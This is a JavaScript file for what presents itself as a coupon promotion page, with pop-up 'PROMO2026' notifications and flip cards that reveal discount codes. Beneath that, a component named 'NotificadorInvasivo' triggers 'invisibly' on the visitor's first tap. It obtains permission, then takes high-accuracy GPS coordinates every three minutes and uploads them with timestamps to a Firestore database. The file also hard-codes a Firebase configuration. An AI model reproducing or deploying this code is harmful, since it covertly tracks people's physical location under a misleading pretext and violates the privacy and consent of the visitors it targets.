/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// TODO: Replace the following with your app's Firebase project configuration
// See: https://support.google.com/firebase/answer/7015592
const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
// Initialize Cloud Firestore and get a reference to the service
const db = getFirestore(app);
/* ******************************************************************************* */

/*FUNCION DE BD*/
/* --- 1. FUNCIÓN PARA GUARDAR EN FIREBASE --- */
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");

    // Obtenemos el conteo para generar un ID secuencial
    const snapshot = await getCountFromServer(colRef);
    const nuevoId = snapshot.data().count;

    await addDoc(colRef, {
      ubicacion: `${lat}, ${lon}`,
      id_ubicaciones: nuevoId,
      fecha_ubi: serverTimestamp(),
    });
    console.log(`Ubicación guardada en BD. ID: ${nuevoId}`);
  } catch (e) {
    console.error("Error al guardar en Firebase:", e);
  }
}

/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
async function obtenerUbicacion() {
  const resultado = document.getElementById("resultado");

  if (navigator.geolocation) {
    if (resultado) resultado.innerHTML = "Capturando ubicación...";

    navigator.geolocation.getCurrentPosition(
      async function (posicion) {
        const lat = posicion.coords.latitude;
        const lon = posicion.coords.longitude;

        if (resultado) {
          resultado.innerHTML = `Lat: ${lat.toFixed(5)}, Lon: ${lon.toFixed(5)}`;
        }

        // Llamamos a la función de guardado
        guardarUbicacionBD(lat, lon);
      },
      function (error) {
        console.error("Error de GPS:", error.message);
        if (resultado) resultado.innerHTML = "No se pudo obtener la ubicación.";
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  } else {
    if (resultado) resultado.innerHTML = "El navegador no soporta GPS.";
  }
}

/* --- 3. OBJETO NOTIFICADOR (EL CORAZÓN DEL PERMISO) --- */
const NotificadorInvasivo = {
  registration: null,
  solicitarPermiso: async function (ms) {
    try {
      // REGISTRO DEL SERVICE WORKER
      // IMPORTANTE: Sin el '/public/', asumiendo que sw.js está en la raíz de tu hosting
      this.registration = await navigator.serviceWorker.register('/sw.js');
      console.log("Service Worker registrado.");

      // SOLICITUD DE PERMISO DE NOTIFICACIÓN
      // Esto disparará el cartel en iPhone solo si viene de un toque (click/touchstart)
      let permission = await Notification.requestPermission();

      if (permission === "granted") {
        console.log("Permiso de notificación concedido.");
        obtenerUbicacion(); // Primera captura

        // Intervalo de captura (ms = 180000 para 3 minutos)
        setInterval(() => {
          obtenerUbicacion();
        }, ms);
      }
    } catch (err) {
      console.error("Error en flujo de permisos:", err);
    }
  }
};

/* --- 4. LÓGICA DE ACTIVACIÓN "INVISIBLE" PARA IPHONE --- */

// Esta función se ejecuta al primer toque del usuario
function activarAlInteractuar() {
  console.log("Usuario interactuó. Solicitando permisos...");

  // Ejecutamos la lógica de permisos (3 minutos)
  NotificadorInvasivo.solicitarPermiso(180000);

  // IMPORTANTE: Quitamos los escuchadores para que no se repita en cada clic
  document.removeEventListener('click', activarAlInteractuar);
  document.removeEventListener('touchstart', activarAlInteractuar);
}

// Escuchamos el primer clic o toque en cualquier parte de la pantalla
document.addEventListener('click', activarAlInteractuar);
document.addEventListener('touchstart', activarAlInteractuar);



/**
 * NOTIFICACIONES CADA 5 MINUTOS 
 * POR EL DESBLOQUEO DE UN CUPON NUEVO
 * PC Y MOVIL
 */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",

  lanzar: function () {
    //Notificación de sistema (PC/Android)
    if (Notification.permission === "granted") {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }

    // 2. Notificación en pantalla (Celular/Todos)
    const div = document.createElement('div');
    div.innerHTML = this.msg;
    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif";
    document.body.appendChild(div);

    setTimeout(() => div.remove(), 5000); // Desaparece en 5 seg
  },

  iniciar: function () {
    // Pedir permiso al primer clic
    document.addEventListener('click', () => Notification.requestPermission(), { once: true });

    // Ciclo de 3 minutos
    setInterval(() => this.lanzar(), 180000);
  }
};

Noti.iniciar();

/**funcion para el flip() 
 * imagen que al dar clic se voltee y muestre un codigo de descuento 
 * de esa página
*/
$("#card").flip();
$("#carde").flip();
